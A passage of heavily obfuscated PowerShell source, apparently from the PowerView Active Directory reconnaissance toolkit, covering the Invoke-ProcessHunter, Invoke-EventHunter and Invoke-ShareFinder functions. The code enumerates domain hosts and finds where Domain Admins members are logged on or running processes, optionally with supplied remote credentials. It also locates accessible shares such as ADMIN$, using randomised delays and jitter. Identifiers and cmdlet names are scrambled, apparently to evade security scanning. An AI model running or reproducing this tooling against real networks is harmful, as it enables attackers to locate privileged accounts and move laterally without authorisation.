        ${jItT`ER} = .3,

        [String]
        ${D`Omain},

        [String]
        ${Do`M`A`IncoNTroLLer},

        [Switch]
        ${sH`OW`ALL},

        [Switch]
        ${SeARcH`F`o`Rest},

        [ValidateRange(1,100)] 
        [Int]
        ${T`hRE`AdS}
    )

    begin {

        if (${pSBO`UN`dp`ARamE`T`ErS}[("{1}{0}" -f'g','Debu')]) {
            ${dEBugPReF`E`R`enCe} = ("{2}{0}{1}"-f 't','inue','Con')
        }

        
        ${ra`ND`No} = &("{1}{2}{0}" -f 'ct','New-Obj','e') ("{2}{0}{1}"-f'stem.Ran','dom','Sy')

        &("{2}{1}{0}" -f 'Verbose','ite-','Wr') ('['+'*] '+'Runni'+'ng'+' '+'Inv'+'oke-'+'Pro'+'ce'+'s'+'sHu'+'nter '+'with'+' '+'d'+'ela'+'y '+'o'+'f '+"$Delay")

        
        
        
        
        

        
        if(${COM`p`Uter`F`ILe}) {
            ${cOM`puTE`R`NAMe} = &("{0}{2}{1}" -f'G','ent','et-Cont') -Path ${cO`Mp`U`TeRFiLe}
        }

        if(!${cOmP`U`TErna`Me}) { 
            [array]${COmP`UTerna`mE} = @()

            if(${DoM`Ain}) {
                ${tA`RGET`dOmainS} = @(${D`OmAin})
            }
            elseif(${Se`ArCh`FOReSt}) {
                
                ${TARGet`D`O`mAiNS} = &("{2}{3}{1}{0}" -f'Domain','t','Get-Ne','tFores') | &("{3}{1}{2}{0}" -f'-Object','rEa','ch','Fo') { ${_}."n`AME" }
            }
            else {
                
                ${T`ARget`dOmaiNS} = @( (&("{0}{1}{3}{2}" -f 'Get','-','ain','NetDom'))."nA`mE" )
            }

            ForEach (${DO`m`Ain} in ${TaR`G`EtdOMA`iNS}) {
                &("{2}{0}{1}{3}{4}" -f 'rit','e-Ve','W','r','bose') ('[*'+'] '+'Que'+'rying '+'d'+'omain'+' '+"$Domain "+'fo'+'r '+'host'+'s')
                ${cO`mpuTE`R`N`AmE} += &("{1}{0}{2}"-f 'etComput','Get-N','er') -Domain ${D`om`AIN} -DomainController ${DO`mA`In`CO`NTroLler} -Filter ${cO`m`puTE`RFIltER} -ADSpath ${CoM`P`UTERADSPaTH}
            }
        
            
            ${ComPut`e`RnaMe} = ${CO`MPuTE`Rna`Me} | &("{2}{3}{1}{0}"-f'bject','O','Whe','re-') { ${_} } | &("{2}{1}{0}{3}"-f 'bjec','O','Sort-','t') -Unique | &("{1}{0}{2}" -f 'ec','Sort-Obj','t') { &("{2}{1}{0}"-f 'andom','-R','Get') }
            if($(${C`O`MP`UTERnAME}."cO`Unt") -eq 0) {
                throw ("{2}{1}{0}{3}"-f't','o hos','N','s found!')
            }
        }

        
        
        
        
        

        if(!${Pr`O`cesS`NAmE}) {
            &("{2}{1}{3}{0}{4}"-f 'bos','rite-','W','Ver','e') ("{11}{4}{15}{5}{1}{6}{13}{2}{0}{3}{12}{7}{14}{9}{10}{8}"-f ',','am','ed',' bu',' ','rocess n','e spe','ng ','r set',' u','se','No','ildi','cifi','a target','p')

            
            ${Ta`RgETUs`Ers} = @()

            
            if(${TA`RGeT`sE`RVER}) {
                &("{0}{4}{3}{1}{2}" -f'Writ','b','ose','Ver','e-') ('Quer'+'yin'+'g '+'target'+' '+'ser'+'ver '+"'$TargetServer' "+'for'+' '+'loc'+'al'+' '+'us'+'ers')
                ${tA`RgEtus`ErS} = &("{1}{2}{3}{0}"-f 'oup','Get','-Net','LocalGr') ${t`ARG`etSe`RVER} -Recurse | &("{1}{0}{2}"-f'ec','Where-Obj','t') {(-not ${_}."i`SgROuP") -and ${_}."iSdO`m`AIn" } | &("{2}{3}{0}{1}"-f 'Ea','ch-Object','F','or') {
                    (${_}."ACcouN`TnA`Me").("{1}{0}" -f'plit','s').Invoke("/")[1].("{1}{2}{0}" -f'r','toL','owe').Invoke()
                }  | &("{1}{3}{2}{0}"-f'ct','Wher','je','e-Ob') {${_}}
            }
            
            elseif(${useRN`AME}) {
                &("{2}{4}{0}{1}{3}" -f 'b','os','W','e','rite-Ver') ('['+'*] '+'Usi'+'ng'+' '+'targ'+'e'+'t '+'user'+' '+"'$UserName'...")
                ${T`ARGe`T`UsERS} = @( ${USerN`A`mE}.("{1}{0}{2}"-f'we','ToLo','r').Invoke() )
            }
            
            elseif(${us`ErFI`lE}) {
                ${taRGe`TU`sErS} = &("{0}{1}{3}{2}"-f 'Get-C','on','ent','t') -Path ${U`Se`RFILe} | &("{1}{2}{0}" -f'-Object','Wher','e') {${_}}
            }
            elseif(${uSE`R`AD`SpaTh} -or ${U`SERfiL`T`Er}) {
                ForEach (${dom`AIN} in ${T`A`RGETdOmai`Ns}) {
                    &("{1}{4}{3}{0}{2}" -f 's','Writ','e','erbo','e-V') ('[*]'+' '+'Qu'+'e'+'rying '+'doma'+'in '+"$Domain "+'for'+' '+'user'+'s')
                    ${TaR`gET`UsErS} += &("{0}{2}{1}"-f'G','tUser','et-Ne') -Domain ${D`OMAiN} -DomainController ${D`Omain`c`o`N`TroLLeR} -ADSpath ${u`SERADsp`A`Th} -Filter ${U`S`erfILtEr} | &("{3}{0}{2}{1}" -f'ch-Obj','ct','e','ForEa') {
                        ${_}."S`AMAC`COUnTnA`me"
                    }  | &("{1}{2}{0}{3}"-f'b','Wh','ere-O','ject') {${_}}
                }            
            }
            else {
                ForEach (${d`Om`AIn} in ${T`Arg`etdom`Ai`Ns}) {
                    &("{0}{4}{3}{1}{2}" -f'Write','b','ose','Ver','-') ('[*]'+' '+'Q'+'uer'+'yi'+'ng '+'doma'+'in '+"$Domain "+'for'+' '+'us'+'e'+'rs '+'of'+' '+'group'+' '+"'$GroupName'")
                    ${TARG`eTUs`e`Rs} += &("{1}{5}{4}{3}{2}{0}"-f'ber','Get-N','m','Me','up','etGro') -GroupName ${g`R`ouPna`mE} -Domain ${do`Main} -DomainController ${d`OmAIn`CoNTR`olLEr}| &("{2}{0}{1}" -f'eac','h-Object','For') {
                        ${_}."MEMB`e`RN`Ame"
                    }
                }
            }

            if ((-not ${S`HowA`ll}) -and ((!${T`A`RGe`TUsErs}) -or (${t`ARGeTU`SERS}."C`Ount" -eq 0))) {
                throw ("{4}{7}{2}{1}{6}{0}{3}{5}" -f'o ','und ','users fo','search fo','[','r!','t','!] No ')
            }
        }

        
        ${h`oStENuMblO`CK} = {
            param(${C`Omp`Uter`NAme}, ${p`ing}, ${prOCe`Ss`N`Ame}, ${T`ArG`Etu`seRS}, ${rEm`o`TE`UsernamE}, ${Rem`otepaS`s`WO`RD})

            
            ${UP} = ${tr`UE}
            if(${PI`Ng}) {
                ${u`p} = &("{1}{3}{0}{2}" -f'Connect','Test','ion','-') -Count 1 -Quiet -ComputerName ${c`o`MP`U`TerNaMe}
            }
            if(${uP}) {
                
                
                if(${r`E`Mo`TEuseRnAme} -and ${RE`mOtEPa`Ss`wORd}) {
                    ${PR`Oce`SsEs} = &("{1}{3}{2}{0}" -f 's','Get-Ne','es','tProc') -RemoteUserName ${ReMoteU`S`Er`N`AME} -RemotePassword ${Re`m`OtEpasS`wo`Rd} -ComputerName ${cOmpUT`E`R`NAMe} -ErrorAction ("{0}{1}{4}{2}{3}" -f'Si','l','ntl','yContinue','e')
                }
                else {
                    ${p`Ro`c`eSSeS} = &("{1}{4}{0}{3}{2}"-f 't-Ne','G','ess','tProc','e') -ComputerName ${c`OMPu`TERN`A`Me} -ErrorAction ("{3}{2}{0}{1}" -f 'ent','lyContinue','l','Si')
                }

                ForEach (${p`RO`CESS} in ${p`Roc`ES`SES}) {
                    
                    if(${PR`ocEssn`A`me}) {
                        ${pR`Oces`Sna`mE}.("{1}{0}"-f't','spli').Invoke(",") | &("{0}{1}{2}"-f 'ForEach-','Objec','t') {
                            if (${Pr`oCE`SS}."pRO`ceSs`NAME" -match ${_}) {
                                ${Pro`C`ess}
                            }
                        }
                    }
                    
                    elseif (${ta`RGETUsE`Rs} -contains ${p`Roc`ESS}."u`SeR") {
                        ${PR`oC`ess}
                    }
                }
            }
        }

    }

    process {

        if(${ThR`E`Ads}) {
            &("{1}{0}{2}{3}" -f'e-','Writ','Ve','rbose') ('Usin'+'g '+'t'+'hrea'+'ding '+'wi'+'th '+'t'+'hrea'+'ds '+'= '+"$Threads")

            
            ${S`crIpTPAR`A`ms} = @{
                ("{0}{1}"-f'P','ing') = $(-not ${n`oPi`Ng})
                ("{0}{3}{2}{1}" -f 'Pr','sName','ces','o') = ${p`R`o`CeSSNamE}
                ("{0}{3}{1}{2}" -f 'Ta','getU','sers','r') = ${targETU`sE`Rs}
                ("{1}{2}{3}{0}"-f'ame','Rem','ote','UserN') = ${R`EMOteuS`eR`Na`me}
                ("{2}{3}{1}{0}" -f 'd','swor','Remot','ePas') = ${re`mO`T`EpASSWOrd}
            }

            
            &("{3}{1}{6}{4}{0}{5}{2}"-f 'n','e-Thre','n','Invok','Fu','ctio','aded') -ComputerName ${COmpu`TE`RNA`mE} -ScriptBlock ${HoStEnum`BlO`Ck} -ScriptParameters ${sCRI`pTpa`R`A`Ms}
        }

        else {
            if(-not ${n`o`PiNG} -and (${Com`pUT`eRN`AmE}."C`ouNt" -ne 1)) {
                
                ${P`iNg} = {param(${COm`PU`TeR`NAMe}) if(&("{2}{1}{4}{0}{3}"-f'onn','e','T','ection','st-C') -ComputerName ${CompuT`ER`NAme} -Count 1 -Quiet -ErrorAction ("{0}{1}" -f'S','top')){${cOM`PUtER`Name}}}
                ${C`omPUter`N`AMe} = &("{2}{5}{1}{0}{3}{4}"-f'de','a','Invoke','dFu','nction','-Thre') -NoImports -ComputerName ${cOmpU`T`e`RNA`Me} -ScriptBlock ${P`InG} -Threads 100
            }

            &("{1}{0}{2}"-f '-V','Write','erbose') "[*] Total number of active hosts: $($ComputerName.count) "
            ${CoU`N`TEr} = 0

            ForEach (${c`ompu`T`er} in ${CoM`pUtEr`NaMe}) {

                ${CoU`Nter} = ${Co`UN`TER} + 1

                
                &("{0}{1}{2}"-f 'Sta','rt-Sle','ep') -Seconds ${rA`NdnO}.("{1}{0}"-f 'ext','N').Invoke((1-${jitT`eR})*${dE`L`AY}, (1+${jiT`TEr})*${dE`lay})

                &("{2}{0}{1}{3}" -f'rite-','Verbos','W','e') "[*] Enumerating server $Computer ($Counter of $($ComputerName.count)) "
                ${res`ULt} = &("{3}{2}{1}{0}"-f'mand','om','ke-C','Invo') -ScriptBlock ${HostE`N`U`mBlocK} -ArgumentList ${co`M`puTEr}, ${F`A`LSE}, ${prOCe`SSN`A`Me}, ${Targ`ETu`SerS}, ${reMo`TEUsERnA`ME}, ${Re`mOtEPAss`wO`RD}
                ${Re`sUlT}

                if(${RE`s`ULt} -and ${sTO`PonSUc`C`esS}) {
                    &("{2}{1}{0}"-f'bose','rite-Ver','W') ("{10}{9}{0}{13}{5}{8}{4}{7}{3}{6}{12}{1}{11}{2}" -f ' ','r','y','et','ss found,','o','u',' r','ce','*]','[','l','rning ea','Target user/pr')
                    return
                }
            }
        }

    }
}


function Inv`oK`E-e`VeNtHU`N`TeR {


    [CmdletBinding()]
    param(
        [Parameter(pOsITiON=0,vALUeFRompipELIne=${tR`Ue})]
        [Alias({"{1}{0}"-f'ts','Hos'})]
        [String[]]
        ${cOMPUte`R`N`A`Me},

        [ValidateScript({&("{1}{0}{2}{3}"-f'Pa','Test-','t','h') -Path ${_} })]
        [Alias({"{2}{1}{0}"-f 'st','i','HostL'})]
        [String]
        ${CoMp`U`Te`RFi`Le},

        [String]
        ${co`M`pu`TErFILTER},

        [String]
        ${CO`m`pU`TeRADs`pAth},

        [String]
        ${GRo`UpNa`ME} = ("{0}{1}{2}"-f 'Domain ','A','dmins'),

        [String]
        ${TA`RGet`SE`Rver},

        [String]
        ${USERn`A`Me},

        [String]
        ${u`SErFI`l`TEr},

        [String]
        ${us`ERAds`P`Ath},

        [ValidateScript({&("{1}{0}" -f 't-Path','Tes') -Path ${_} })]
        [String]
        ${user`F`Ile},

        [String]
        ${Do`mA`in},

        [String]
        ${DOmA`iNC`oNtR`oll`ER},

        [Int32]
        ${S`EaRc`hd`AYs} = 3,

        [Switch]
        ${sEAR`CHfore`St},

        [ValidateRange(1,100)] 
        [Int]
        ${t`hreA`DS}
    )

    begin {

        if (${psbO`UndP`A`RAMetE`RS}[("{1}{0}"-f'ebug','D')]) {
            ${d`ebUG`Pr`efErEn`CE} = ("{1}{2}{0}" -f'nue','C','onti')
        }

        
        ${Ra`NdNo} = &("{1}{2}{3}{0}"-f't','N','ew-Ob','jec') ("{2}{1}{0}"-f 'om','em.Rand','Syst')

        &("{2}{1}{0}{3}" -f 'o','rite-Verb','W','se') ("{1}{3}{6}{4}{2}{0}{5}{7}"-f 'Invoke','[*','ng ','] R','i','-Even','unn','tHunter')

        if(${do`MAIn}) {
            ${TarGE`Td`o`mAi`NS} = @(${d`oMaiN})
        }
        elseif(${SEAR`chfoRe`ST}) {
            
            ${TaR`getDoma`i`NS} = &("{2}{3}{1}{0}" -f 'in','estDoma','Get-','NetFor') | &("{3}{0}{2}{1}"-f 'ch-','ect','Obj','ForEa') { ${_}."N`Ame" }
        }
        else {
            
            ${TA`RGet`Do`mai`NS} = @( (&("{1}{2}{0}"-f 'in','Get','-NetDoma'))."nA`mE" )
        }

        
        
        
        
        

        if(!${cO`mp`UtERna`mE}) { 
            
            if(${C`OMpUT`E`R`File}) {
                ${com`PUteRnA`Me} = &("{0}{2}{1}{3}"-f'Get','Cont','-','ent') -Path ${cOMPu`TErf`ile}
            }
            elseif(${coMputeRf`Il`T`er} -or ${cOm`PuTERadS`PAth}) {
                [array]${c`OMPu`T`E`RnaME} = @()
                ForEach (${DO`M`AIn} in ${TAR`Getdo`ma`I`Ns}) {
                    &("{1}{2}{0}{3}" -f 'e','Write-','V','rbose') ('[*]'+' '+'Qu'+'er'+'y'+'ing '+'dom'+'ain '+"$Domain "+'fo'+'r '+'host'+'s')
                    ${CoMP`U`TE`Rna`ME} += &("{3}{0}{1}{2}"-f'et-NetCompu','te','r','G') -Domain ${DO`mA`in} -DomainController ${DomAinC`O`NT`Ro`LlER} -Filter ${Com`PUTerFi`LTER} -ADSpath ${com`p`UtER`Ads`path}
                }
            }
            else {
                
                [array]${C`OM`PUTerna`me} = @()
                ForEach (${DOM`AIN} in ${t`A`RgETd`OmaI`NS}) {
                    &("{2}{0}{1}{3}"-f '-','Ve','Write','rbose') ('['+'*] '+'Que'+'ryin'+'g '+'d'+'omain '+"$Domain "+'for'+' '+'domai'+'n '+'con'+'trol'+'le'+'rs')
                    ${CoM`pUTe`RN`AmE} += &("{4}{1}{0}{3}{2}"-f'omainC','et-NetD','er','ontroll','G') -LDAP -Domain ${Do`main} -DomainController ${DO`main`ContR`O`lL`eR} | &("{2}{1}{0}"-f 'ject','orEach-Ob','F') { ${_}."DnSH`OsT`N`AME"}
                }
            }

            
            ${co`mp`Ut`er`NaME} = ${cO`mPUTErn`A`ME} | &("{2}{3}{0}{1}" -f'e-Obj','ect','W','her') { ${_} } | &("{0}{1}{2}" -f 'Sor','t-Ob','ject') -Unique | &("{1}{2}{3}{0}" -f't','Sort-O','b','jec') { &("{0}{2}{1}"-f'Get-R','ndom','a') }
            if($(${Co`M`pUtern`AMe}."Cou`NT") -eq 0) {
                throw ("{3}{1}{2}{0}" -f'd!','os','ts foun','No h')
            }
        }

        
        
        
        
        

        
        ${t`ArGet`Us`eRS} = @()

        
        if(${tAr`gE`TsErVer}) {
            &("{2}{1}{0}{4}{3}" -f '-','e','Writ','bose','Ver') ('Queryin'+'g'+' '+'tar'+'g'+'et '+'s'+'er'+'ver '+"'$TargetServer' "+'for'+' '+'local'+' '+'user'+'s')
            ${Ta`Rg`eTUSeRs} = &("{2}{1}{3}{0}" -f'Group','et','Get-N','Local') ${tA`Rg`ET`SerVER} -Recurse | &("{0}{2}{1}" -f 'Wh','Object','ere-') {(-not ${_}."isg`ROUP") -and ${_}."isDO`MA`in" } | &("{4}{0}{2}{1}{3}"-f 'rEach','O','-','bject','Fo') {
                (${_}."Acc`ount`NAMe").("{1}{0}"-f't','spli').Invoke("/")[1].("{0}{1}{2}"-f 't','oLowe','r').Invoke()
            }  | &("{0}{1}{2}" -f 'Wh','ere-Obje','ct') {${_}}
        }
        
        elseif(${US`eR`NAME}) {
            &("{1}{2}{0}"-f 'se','Wri','te-Verbo') ('[*'+'] '+'U'+'sing '+'t'+'ar'+'get '+'us'+'er '+"'$UserName'...")
            ${T`ArG`eT`UsERs} = @( ${U`S`ER`NaMe}.("{2}{1}{0}" -f 'wer','oLo','T').Invoke() )
        }
        
        elseif(${U`sERFI`le}) {
            ${TAr`gEtu`se`RS} = &("{0}{1}{2}"-f 'G','et-Conten','t') -Path ${u`Se`RfI`Le} | &("{0}{2}{1}"-f'Wh','ect','ere-Obj') {${_}}
        }
        elseif(${UsER`AD`S`PatH} -or ${Us`ErFIl`T`ER}) {
            ForEach (${dom`AiN} in ${Ta`RG`et`do`mainS}) {
                &("{1}{3}{2}{0}" -f 'e','Write-Ve','s','rbo') ('[*]'+' '+'Qu'+'e'+'r'+'ying '+'domain'+' '+"$Domain "+'fo'+'r '+'u'+'sers')
                ${ta`RgE`TusErS} += &("{1}{0}{2}" -f'-NetU','Get','ser') -Domain ${do`M`AiN} -DomainController ${Do`maINCONT`ROL`lER} -ADSpath ${UsERa`ds`pAth} -Filter ${u`sERFiL`TER} | &("{2}{1}{3}{0}"-f'ct','orEach','F','-Obje') {
                    ${_}."sa`M`ACc`OUNtnAmE"
                }  | &("{2}{0}{1}"-f '-Objec','t','Where') {${_}}
            }            
        }
        else {
            ForEach (${d`OMAIN} in ${t`ARg`e`TDomAinS}) {
                &("{2}{1}{0}{3}" -f 'V','ite-','Wr','erbose') ('[*]'+' '+'Quer'+'yin'+'g'+' '+'domain'+' '+"$Domain "+'for'+' '+'u'+'se'+'rs '+'o'+'f '+'gr'+'oup '+"'$GroupName'")
                ${TArg`eT`U`SeRs} += &("{4}{1}{3}{0}{2}" -f'upMe','tGr','mber','o','Get-Ne') -GroupName ${GR`oupN`AMe} -Domain ${d`OMA`iN} -DomainController ${D`omainc`On`TroLleR} | &("{2}{3}{1}{0}" -f'Object','-','Fore','ach') {
                    ${_}."MEMb`ERNa`mE"
                }
            }
        }

        if (((!${T`ArgETU`SeRs}) -or (${T`ARge`TUS`ers}."c`oUNt" -eq 0))) {
            throw ("{3}{0}{5}{2}{6}{1}{4}" -f 'rs f',' s','n','[!] No use','earch for!','ou','d to')
        }

        
        ${HO`s`TENu`MblOcK} = {
            param(${Co`mpUt`ER`NAME}, ${P`inG}, ${T`ARGET`USers}, ${SEAr`cHD`AYs})

            
            ${u`P} = ${T`RuE}
            if(${P`ING}) {
                ${Up} = &("{3}{1}{2}{4}{0}"-f 'ion','est-','Con','T','nect') -Count 1 -Quiet -ComputerName ${cOmpU`TEr`Na`ME}
            }
            if(${UP}) {
                
                &("{2}{1}{0}" -f't','Even','Get-User') -ComputerName ${COmP`UtEr`Na`ME} -EventType 'all' -DateStart (  ${5`mBI}::"T`odAY".("{0}{1}" -f'AddDay','s').Invoke(-${sE`Arc`h`dAys})) | &("{0}{3}{1}{2}"-f 'Whe','e-Ob','ject','r') {
                    
                    ${t`ARG`EtusErs} -contains ${_}."U`sER`NaME"
                }
            }
        }

    }

    process {

        if(${TH`R`eadS}) {
            &("{1}{2}{0}"-f 'ose','Write-V','erb') ('U'+'s'+'ing '+'thre'+'a'+'ding '+'with'+' '+'thread'+'s'+' '+'= '+"$Threads")

            
            ${S`Cr`I`pTPA`RamS} = @{
                ("{1}{0}" -f 'ng','Pi') = $(-not ${n`OPiNg})
                ("{1}{3}{0}{2}"-f'ser','T','s','argetU') = ${T`ArGet`Use`Rs}
                ("{2}{3}{0}{1}"-f 'hD','ays','S','earc') = ${SEa`R`Ch`dayS}
            }

            
            &("{4}{2}{3}{1}{0}" -f 'dFunction','reade','ke','-Th','Invo') -ComputerName ${co`mPUte`Rn`A`ME} -ScriptBlock ${hOST`En`UMb`lo`Ck} -ScriptParameters ${s`cr`IpTParA`mS}
        }

        else {
            if(-not ${N`O`pInG} -and (${C`OmPuT`eRNAmE}."C`OuNt" -ne 1)) {
                
                ${P`inG} = {param(${CO`Mp`U`TErNaMe}) if(&("{0}{2}{3}{1}"-f 'Test-C','ion','o','nnect') -ComputerName ${co`mPu`TER`Name} -Count 1 -Quiet -ErrorAction ("{1}{0}" -f'top','S')){${cO`Mpu`Te`RNAMe}}}
                ${C`omPUTeRn`AME} = &("{6}{4}{3}{5}{0}{1}{2}" -f'Fun','c','tion','rea','voke-Th','ded','In') -NoImports -ComputerName ${COMP`U`TErname} -ScriptBlock ${p`inG} -Threads 100
            }

            &("{0}{1}{2}{3}"-f 'Wri','t','e-Verb','ose') "[*] Total number of active hosts: $($ComputerName.count) "
            ${C`oUNt`eR} = 0

            ForEach (${co`M`puTER} in ${CoMpuTe`R`N`AME}) {

                ${Co`UnT`ER} = ${C`ouNter} + 1

                
                &("{1}{2}{0}"-f 'p','Start-Sl','ee') -Seconds ${R`ANd`NO}.("{1}{0}"-f 't','Nex').Invoke((1-${ji`T`Ter})*${dE`lay}, (1+${j`ITTEr})*${del`AY})

                &("{2}{0}{1}"-f 'rbos','e','Write-Ve') "[*] Enumerating server $Computer ($Counter of $($ComputerName.count)) "
                &("{2}{0}{1}{3}"-f'o','mma','Invoke-C','nd') -ScriptBlock ${hos`Te`NU`mb`lOCk} -ArgumentList ${cOm`P`UTER}, $(-not ${N`oPi`NG}), ${Ta`RGE`T`UseRs}, ${SEARC`Hda`ys}
            }
        }

    }
}


function i`N`VokE-sharefInd`Er {


    [CmdletBinding()]
    param(
        [Parameter(pOsITion=0,ValUeFrOMpIPELiNE=${T`RuE})]
        [Alias({"{1}{0}"-f'sts','Ho'})]
        [String[]]
        ${C`OmPuT`e`RN`AmE},

        [ValidateScript({&("{2}{0}{1}"-f '-Pat','h','Test') -Path ${_} })]
        [Alias({"{2}{0}{1}"-f 'Li','st','Host'})]
        [String]
        ${coMpU`TE`RFI`le},

        [String]
        ${cOm`P`UTEr`FIl`TER},

        [String]
        ${cOm`PuteRAD`spaTh},

        [Switch]
        ${e`x`CLudesTA`NDA`RD},

        [Switch]
        ${eXc`LUdEPr`int},

        [Switch]
        ${EX`cl`Ude`iPc},

        [Switch]
        ${n`Op`iNG},

        [Switch]
        ${chEcKsh`AR`Ea`cc`ESS},

        [Switch]
        ${cheC`k`AdM`In},

        [UInt32]
        ${deL`Ay} = 0,

        [Double]
        ${JI`TT`Er} = .3,

        [String]
        ${dOMa`In},

        [String]
        ${d`OmAINc`O`NtRo`LlEr},
 
        [Switch]
        ${SEaRCh`FoR`eSt},

        [ValidateRange(1,100)] 
        [Int]
        ${t`hrEADs}
    )

    begin {
        if (${p`sB`O`UNdpArAmeTErS}[("{0}{1}" -f'Deb','ug')]) {
            ${dEB`UGp`REFEren`ce} = ("{0}{1}"-f'Conti','nue')
        }

        
        ${R`AN`dnO} = &("{2}{1}{0}" -f'ect','bj','New-O') ("{3}{0}{2}{1}"-f 'ystem.Rand','m','o','S')

        &("{1}{0}{2}" -f 'ite-V','Wr','erbose') ('[*]'+' '+'Ru'+'nning '+'I'+'n'+'voke-Sh'+'areFi'+'nde'+'r '+'w'+'ith '+'dela'+'y '+'o'+'f '+"$Delay")

        
        [String[]] ${eX`clU`deD`shA`ReS} = @('')

        if (${EX`c`lU`D`EpRInT}) {
            ${eXC`LU`deDsH`Ar`Es} = ${e`Xc`LU`D`EDshares} + "PRINT$"
        }
        if (${eXclU`dei`pc}) {
            ${E`xc`lUDEDsH`AReS} = ${E`x`CLu`dedS`harEs} + "IPC$"
        }
        if (${E`XCl`UDESTaNd`ArD}) {
            ${eX`CLUD`eDsHa`RES} = @('', "ADMIN$", "IPC$", "C$", "PRINT$")
        }

        
        if(${C`o`mPUteRFIle}) {
            ${COm`p`UTE`RnaME} = &("{0}{1}{2}" -f'Get','-Conte','nt') -Path ${c`oMPu`TeRFILe}
        }

        if(!${c`O`MP`UT`ernAME}) { 
            [array]${CO`MPu`TE`RNamE} = @()

            if(${DOm`A`in}) {
                ${TARgeTDO`MaI`NS} = @(${DOm`AIn})
            }
            elseif(${s`e`Archf`OrESt}) {
                
                ${targET`do`MA`i`Ns} = &("{3}{2}{1}{0}" -f 'ain','m','o','Get-NetForestD') | &("{2}{4}{0}{3}{1}" -f'Obje','t','ForE','c','ach-') { ${_}."nA`Me" }
            }
            else {
                
                ${T`ARgeTdOmaI`Ns} = @( (&("{3}{0}{1}{2}" -f'etD','om','ain','Get-N'))."nA`Me" )
            }
                
            ForEach (${dOm`AIN} in ${Targ`ETdOma`InS}) {
                &("{1}{2}{0}" -f 'Verbose','Wri','te-') ('['+'*] '+'Query'+'i'+'ng '+'domain'+' '+"$Domain "+'for'+' '+'host'+'s')
                ${c`o`mPUt`eRNA`mE} += &("{4}{3}{2}{1}{0}" -f 'uter','tComp','Ne','-','Get') -Domain ${D`oMA`in} -DomainController ${DO`Mai`NCo`NTRoL`LER} -Filter ${C`OmPuteRfIL`T`ER} -ADSpath ${cO`mpu`TeR`ADs`P`ATh}
            }
        
            
            ${cOmpu`TE`R`NAME} = ${c`oMPUte`RNaMe} | &("{2}{1}{0}"-f 'ct','ere-Obje','Wh') { ${_} } | &("{1}{2}{0}"-f 'Object','So','rt-') -Unique | &("{2}{3}{1}{0}"-f 'ct','e','Sort','-Obj') { &("{0}{3}{2}{1}"-f'G','dom','-Ran','et') }
            if($(${co`Mp`Ut`erNAMe}."COU`NT") -eq 0) {
                throw ("{0}{3}{2}{1}"-f'No hos','!','d','ts foun')
            }
        }

        
        ${H`osteNuM`Blo`CK} = {
            param(${cOMpUTE`R`N`A`Me}, ${P`INg}, ${C`heCkshAr`EacCe`ss}, ${EXClu`d`Ed`shAreS}, ${c`heCKadM`IN})

            
            ${U`p} = ${t`RUE}
            if(${pI`NG}) {
                ${uP} = &("{0}{2}{3}{1}" -f'Tes','on','t-C','onnecti') -Count 1 -Quiet -ComputerName ${cOmp`Ute`R`NamE}
            }
            if(${u`p}) {
                
                ${SHa`Res} = &("{2}{1}{3}{0}" -f 'e','et','Get-N','Shar') -ComputerName ${c`OmpuTeRn`A`mE}
                ForEach (${S`HarE} in ${SH`Ar`ES}) {
                    &("{2}{1}{0}" -f 'ebug','rite-D','W') ('[*]'+' '+'Serv'+'er '+'share'+':'+' '+"$Share")
                    ${NETn`A`mE} = ${s`Ha`RE}."SH`i1`_n`ETnAMe"
                    ${R`e`mark} = ${sH`Are}."S`H`i1_rema`Rk"
                    ${P`ATH} = '\\'+${coMp`UTE`R`NAME}+'\'+${Ne`T`NAMe}

                    
                    if ((${n`EtnamE}) -and (${nETn`A`Me}.("{1}{0}"-f'im','tr').Invoke() -ne '')) {
                        
                        if(${che`CKaDM`in}) {
                            if(${nEt`NAmE}.("{0}{1}"-f'T','oUpper').Invoke() -eq "ADMIN$") {
                                try {
                                    ${NU`lL} =   (&("{2}{0}{1}"-f 'iAB','LE','VAR')  ('CrG'+'p0')  -vALUeO  )::("{1}{2}{0}" -f 'es','GetFi','l').Invoke(${pA`TH})
                                    ("\\$ComputerName\$NetName "+"`t- "+"$Remark")
                                }
                                catch {
                                    &("{2}{3}{1}{0}" -f'ebug','-D','Wri','te') ('Er'+'r'+'or '+'a'+'cces'+'s'+'ing '+'p'+'ath '+"$Path "+': '+"$_")
                                }
                            }
                        }
                        
                        elseif (${EXC`l`Ud`EDsh`ArES} -NotContains ${N`eTNA`Me}.("{0}{2}{1}"-f'T','r','oUppe').Invoke()) {
                            
                            if(${C`HEcK`SharEaC`cess}) {
                                
                                try {
                                    ${N`ULL} =   (  &("{3}{0}{1}{2}" -f 'T-VAR','IabL','E','GE') CrGp0).valUE::("{0}{1}" -f 'Get','Files').Invoke(${pA`Th})
                                    ("\\$ComputerName\$NetName "+"`t- "+"$Remark")
                                }
                                catch {
                                    &("{0}{2}{1}{3}" -f'W','ite-Deb','r','ug') ('E'+'rror '+'ac'+'ces'+'sing '+'path'+' '+"$Path "+': '+"$_")
                                }
                            }
                            else {
                                ("\\$ComputerName\$NetName "+"`t- "+"$Remark")
                            }
                        }
                    }
                }
            }
        }

    }

    process {

        if(${T`hr`EaDS}) {
            &("{1}{0}{3}{4}{2}" -f 'i','Wr','rbose','te','-Ve') ('U'+'sing '+'t'+'hreadi'+'ng '+'with'+' '+'thre'+'a'+'ds '+'= '+"$Threads")

            
            ${Sc`R`ipTP`ArAMS} = @{
                ("{0}{1}"-f'Pi','ng') = $(-not ${NoP`i`Ng})
                ("{3}{1}{0}{5}{2}{4}" -f'kS','c','a','Che','reAccess','h') = ${cHEC`K`shAreacc`e`sS}
                ("{3}{2}{0}{1}" -f'edSha','res','xclud','E') = ${EXcL`UD`eDS`hAR`ES}
                ("{2}{1}{0}" -f 'min','eckAd','Ch') = ${cHec`KA`dmiN}
            }

            
            &("{1}{4}{3}{0}{5}{2}"-f 'unc','Invoke','on','eadedF','-Thr','ti') -ComputerName ${CO`MpuTE`RnaME} -ScriptBlock ${HOs`TEnu`mBlOcK} -ScriptParameters ${S`CR`i`PtPARa`mS}
        }

        else {
            if(-not ${n`Op`INg} -and (${cO`mp`U`TeRnAME}."C`oUnT" -ne 1)) {
                
                ${pi`Ng} = {param(${coMP`Uterna`ME}) if(&("{3}{0}{2}{1}"-f 'C','on','onnecti','Test-') -ComputerName ${co`mpU`TerNamE} -Count 1 -Quiet -ErrorAction ("{0}{1}"-f 'Sto','p')){${co`MPUTeRNA`me}}}
                ${cOMPU`TEr`N`AME} = &("{2}{3}{1}{0}{4}"-f'unc','oke-ThreadedF','In','v','tion') -NoImports -ComputerName ${CoMpUt`ER`N`AMe} -ScriptBlock ${pi`Ng} -Threads 100
            }

